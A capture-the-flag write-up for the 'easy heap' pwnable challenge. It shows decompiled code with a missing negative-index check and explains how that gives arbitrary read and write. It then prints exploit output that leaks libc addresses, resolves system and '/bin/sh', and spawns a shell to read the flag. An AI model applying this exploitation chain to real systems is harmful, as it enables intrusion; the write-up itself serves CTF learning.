# easy heap
**Category:** Pwnable
**Points:** 100
**Solves:** 44
**Description:**
> Download in : [Link](https://drive.google.com/open?id=1VNi6Nbi5i-r9D5sZo_ZdgtUkA5u_3g8B)
> Service: nc armexploit.acebear.site 3002

## Writeup
```
$ file easy_heap
easy_heap: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=89e53b704c36245e1ab38a71c9f1349898e373ea, stripped
```

### The Bug
Binary has some functions: create, edit, delete, show and exit.


* We can write address into bss by input **NAME (0x0804B0E0)**.
* Edit, delete, show functions not check idx if it is negative and integer overflow by **DWORD PTR [idx*4+0x0804B0A0]**

```c
int show()
{
  int idx; // [esp+Ch] [ebp-Ch]

  printf("Index: ");
  idx = readInt();
  if ( idx > 9 )
    return puts("Out of list name (0 <= index < 10)!!!");
  if ( !LIST[idx] )
    return puts("None name");
  printf("This name %d is: %s\n", idx, LIST[idx]);
  return puts("Done!");
}

int edit()
{
  int idx; // [esp+Ch] [ebp-Ch]

  printf("Index: ");
  idx = readInt();
  if ( idx > 9 )
    return puts("Out of list name (0 <= index < 10)!!!");
  if ( !LIST[idx] )
    return puts("None name");
  printf("Input new name: ");
  secure_read(LIST[idx], 0x20u);
  return puts("Done!");
}
```

So we can read and write arbitrary memory address.

### Exploit
[easy_heap.py](/pwn/easy_heap/easy_heap.py)
```
$ python easy_heap.py 3
[+] Opening connection to easyheap.acebear.site on port 3002: Done
[*] atoi_got: 0xf7def050
[*] baselibc: 0xf7dc2000
[*] system: 0xf7dfc940
[*] str_bin_sh: 0xf7f1b00b
[*] Switching to interactive mode
 $ id
uid=1000(easy_heap) gid=1000(easy_heap) groups=1000(easy_heap)
$ cat /ho*/*/flag
AceBear{m4yb3_h34p_i5_3a5y_f0r_y0u}$
```

